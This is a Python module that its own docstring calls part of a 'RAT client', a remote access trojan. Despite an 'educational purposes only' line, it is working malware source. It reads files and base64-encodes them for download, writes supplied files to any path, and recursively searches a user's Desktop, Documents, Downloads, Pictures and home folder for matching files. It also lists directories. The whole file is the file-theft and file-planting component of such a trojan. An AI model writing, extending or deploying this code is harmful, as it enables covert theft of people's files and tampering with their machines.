"""
File Manager - Handle file operations (download, upload, search)
For educational purposes only
"""

from pathlib import Path
from datetime import datetime
import base64

class FileManager:
    """Manage file operations for the RAT client"""
    
    def __init__(self, max_search_results=100) -> None:
        """
        Initialize file manager
        Args:
            max_search_results: Maximum number of search results
        """
        try:
            self.max_search_results = max_search_results
        except Exception as e:
            raise Exception("FileManager Initialization Error in __init__ function - " + str(e), "error")
    
    def download(self, filepath) -> dict:
        """
        Read file and encode to base64 for download
        Args:
            filepath: Path to file to download
        Returns:
            dict: File data with base64 encoded content
        """

        try:
            path = Path(filepath)
            
            if not path.exists():
                return {
                    'success': False,
                    'filename': path.name,
                    'error': 'File not found'
                }
            
            if not path.is_file():
                return {
                    'success': False,
                    'filename': path.name,
                    'error': 'Path is not a file'
                }
            
            # Check file size (limit to 50MB for safety)
            file_size = path.stat().st_size
            if file_size > 50 * 1024 * 1024:
                return {
                    'success': False,
                    'filename': path.name,
                    'error': f'File too large ({file_size} bytes)'
                }
            
            # Read and encode
            with open(path, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode('utf-8')
            
            return {
                'success': True,
                'filename': path.name,
                'filepath': str(path),
                'data': file_data,
                'size': file_size,
                'timestamp': datetime.now().isoformat()
            }
        
        except PermissionError:
            return {
                'success': False,
                'filename': Path(filepath).name,
                'error': 'Permission denied'
            }
        
        except Exception as e:
            return {
                'success': False,
                'filename': Path(filepath).name,
                'error': str(e)
            }
    
    def upload(self, filepath, data_b64) -> dict:
        """
        Decode base64 data and write to file
        Args:
            filepath: Path where to save the file
            data_b64: Base64 encoded file data
        Returns:
            dict: Upload result
        """

        try:
            # Decode base64
            file_data = base64.b64decode(data_b64)
            
            # Create directory if needed
            path = Path(filepath)
            path.parent.mkdir(parents=True, exist_ok=True)
            
            # Write file
            with open(path, 'wb') as f:
                f.write(file_data)
            
            return {
                'success': True,
                'filepath': str(path),
                'size': len(file_data),
                'timestamp': datetime.now().isoformat()
            }
        
        except Exception as e:
            return {
                'success': False,
                'filepath': filepath,
                'error': str(e)
            }
    
    def search(self, pattern, search_dirs=None) -> dict:
        """
        Search for files matching pattern
        Args:
            pattern: Glob pattern to search (e.g., "*.pdf", "report*.docx")
            search_dirs: List of directories to search (default: common dirs)
        Returns:
            dict: Search results
        """

        try:
            # Default search directories
            if search_dirs is None:
                search_dirs = [
                    Path.home() / "Desktop",
                    Path.home() / "Documents",
                    Path.home() / "Downloads",
                    Path.home() / "Pictures",
                    Path.home()
                ]
            
            results = []
            
            for search_dir in search_dirs:
                if not search_dir.exists():
                    continue
                
                try:
                    # Use rglob for recursive search
                    for file in search_dir.rglob(pattern):
                        if file.is_file():
                            try:
                                stat = file.stat()
                                results.append({
                                    'path': str(file),
                                    'name': file.name,
                                    'size': stat.st_size,
                                    'modified': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                                    'created': datetime.fromtimestamp(stat.st_ctime).isoformat()
                                })
                                
                                # Limit results
                                if len(results) >= self.max_search_results:
                                    break
                            except (PermissionError, OSError):
                                continue
                
                except (PermissionError, OSError):
                    continue
                
                if len(results) >= self.max_search_results:
                    break
            
            return {
                'success': True,
                'pattern': pattern,
                'results': results,
                'count': len(results),
                'limited': len(results) >= self.max_search_results,
                'timestamp': datetime.now().isoformat()
            }
        
        except Exception as e:
            return {
                'success': False,
                'pattern': pattern,
                'error': str(e)
            }
    
    def list_directory(self, dirpath) -> dict:
        """
        List contents of a directory
        Args:
            dirpath: Path to directory
        Returns:
            dict: Directory contents
        """
        
        try:
            path = Path(dirpath)
            
            if not path.exists():
                return {
                    'success': False,
                    'error': 'Directory not found'
                }
            
            if not path.is_dir():
                return {
                    'success': False,
                    'error': 'Path is not a directory'
                }
            
            contents = []
            
            for item in path.iterdir():
                try:
                    stat = item.stat()
                    contents.append({
                        'name': item.name,
                        'path': str(item),
                        'type': 'dir' if item.is_dir() else 'file',
                        'size': stat.st_size if item.is_file() else 0,
                        'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
                    })
                except (PermissionError, OSError):
                    continue
            
            return {
                'success': True,
                'directory': str(path),
                'contents': contents,
                'count': len(contents)
            }
        
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }